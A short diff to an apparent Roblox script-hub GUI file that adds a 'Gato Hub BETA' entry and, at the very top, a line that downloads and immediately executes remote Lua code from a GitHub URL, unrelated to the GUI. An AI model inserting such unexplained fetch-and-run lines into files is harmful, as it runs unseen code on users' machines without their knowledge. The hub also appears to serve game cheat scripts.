@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rivalslol/scripts/main/noti.lua"))()
+
+
 -- Gui to Lua
 -- Version: 3.3
 
@@ -1808,6 +1811,13 @@ local function NYMIRF_fake_script() -- ScriptHub.ScriptHubScript
 			Author = "Gato",
 			Description = "Best pet catchers script.",
 			Image = GetImage("gatohub", "https://i.imgur.com/PITdD61.png")
+		},
+		{
+			Name = "Gato Hub BETA",
+			Script = GetScript("gatohubbeta"),
+			Author = "Gato",
+			Description = "Best pet catchers script.[BETA]",
+			Image = GetImage("gatohubbeta", "https://i.imgur.com/PITdD61.png")
 		},
 		{
 			Name = "Server Rejoin",
